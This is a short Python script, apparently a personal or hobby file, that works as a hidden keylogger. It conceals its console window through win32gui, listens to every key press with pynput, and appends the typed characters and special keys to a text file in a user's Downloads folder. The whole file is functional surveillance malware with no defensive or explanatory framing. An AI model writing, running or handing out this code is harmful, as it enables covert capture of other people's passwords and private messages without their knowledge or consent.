from pynput import keyboard

# Hide the console window (optional, if required)
import win32console
import win32gui
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# File to log keystrokes
log_file = r'c:\Users\Asus\Downloads\output.txt'

def on_press(key):
    try:
        # Log alphanumeric keys
        with open(log_file, 'a') as f:
            f.write(key.char)
    except AttributeError:
        # Log special keys like space, enter, etc.
        with open(log_file, 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f' [{key}] ')  # Other special keys

# Start listening for keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()